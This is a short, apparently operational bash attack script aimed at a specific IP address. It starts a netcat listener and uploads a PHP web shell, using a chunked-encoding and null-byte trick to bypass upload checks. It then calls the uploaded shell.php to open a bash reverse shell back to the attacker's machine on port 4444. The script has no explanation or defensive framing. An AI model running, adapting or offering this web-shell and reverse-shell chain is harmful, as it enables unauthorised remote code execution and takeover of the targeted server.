IP=$(curl -s ifconfig.me)
nc -lvnp 4444 &

# 🔥 UPLOAD BYPASS (chunked + null byte)
curl -k -X POST \
-H "Transfer-Encoding: chunked" \
-H "Content-Type: multipart/form-data" \
--data-binary $'<?php /*%00*/ system($_REQUEST[0]); ?>0\r\n\r\n' \
"https://14.225.209.143:443//upload.php"

sleep 2
curl "https://14.225.209.143:443/shell.php?0=bash%20-i%20%3E%26%20/dev/tcp/$IP/4444%200%3E%261"
